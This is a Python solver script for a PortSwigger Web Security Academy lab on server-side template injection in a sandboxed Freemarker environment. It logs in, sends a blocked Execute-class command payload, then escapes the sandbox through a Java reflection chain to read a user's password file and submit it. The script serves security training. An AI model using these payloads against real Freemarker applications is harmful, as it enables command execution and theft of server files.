#!/usr/bin/env python3
"""
Server-side template injection in a sandboxed environment
PortSwigger Web Security Academy -- Server-Side Template Injection

Companion script for the writeup: 06-ssti-in-a-sandboxed-environment.md

What this does:
    Logs in as content-manager, re-sends the Execute-class payload from the
    documentation lab to confirm the sandbox now blocks it ("not allowed ...
    for security reasons"), then escapes the sandbox via plain Java
    reflection through the `product` object already present in the template
    context: `.class -> protectionDomain -> codeSource -> location -> toURI()
    -> resolve(path) -> toURL() -> openStream() -> readAllBytes()`. None of
    those method names are on Freemarker's own blocklist, because the
    sandbox restricts named utility classes, not reflection itself. The
    response comes back as comma-separated decimal byte values, which this
    script decodes to ASCII locally and submits as the lab's answer.

Usage:
    python 06-ssti-in-a-sandboxed-environment.py <lab-url>
    e.g. python 06-ssti-in-a-sandboxed-environment.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

TEMPLATE_URL = "/product/template?productId=1"
TARGET_FILE = "/home/carlos/my_password.txt"
CONTEXT_OBJECT = "product"


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url, follow_redirects=True, timeout=15)
    match = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if not match:
        match = re.search(r'value="([^"]+)"\s+name="csrf"', r.text)
    return match.group(1) if match else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    print("[*] Logging in as content-manager")
    csrf = _get_csrf(client, f"{lab_url}/login")
    client.post(f"{lab_url}/login",
                data={"csrf": csrf, "username": "content-manager", "password": "C0nt3ntM4n4g3r"})
    print("[+] Logged in.")

    tpl_url = f"{lab_url}{TEMPLATE_URL}"

    print("[*] Confirming the sandbox blocks the Execute class")
    tpl_csrf = _get_csrf(client, tpl_url)
    blocked_payload = '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
    blocked_resp = client.post(tpl_url, data={
        "csrf": tpl_csrf, "template": blocked_payload, "template-action": "preview",
    })
    if "not allowed" in blocked_resp.text.lower() or "security" in blocked_resp.text.lower():
        print("[+] Confirmed: Execute class blocked by sandbox.")
    else:
        print("[!] Sandbox check inconclusive, proceeding with reflection chain anyway.")

    print(f"[*] Reading {TARGET_FILE} via Java reflection through '{CONTEXT_OBJECT}'")
    tpl_csrf2 = _get_csrf(client, tpl_url)
    reflection_payload = (
        "${" + CONTEXT_OBJECT + ".class.protectionDomain.codeSource.location"
        '.toURI().resolve("' + TARGET_FILE + '").toURL().openStream()'
        '.readAllBytes()?join(",")}'
    )
    resp = client.post(tpl_url, data={
        "csrf": tpl_csrf2, "template": reflection_payload, "template-action": "preview",
    })

    match = re.search(r'id=preview-result>\s*\n?\s*([\d,]+)', resp.text)
    if not match:
        print(f"[-] Sandbox read failed. Response snippet: {resp.text[:200]}")
        return

    byte_str = match.group(1)
    password = ''.join(chr(int(b)) for b in byte_str.split(',')).strip()
    print(f"[+] Password extracted: {password}")

    print("[*] Submitting password to /submitSolution")
    client.post(f"{lab_url}/submitSolution", data={"answer": password})

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- password read via Freemarker sandbox reflection escape.")
    else:
        print("[-] Not solved yet -- inspect the response manually.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
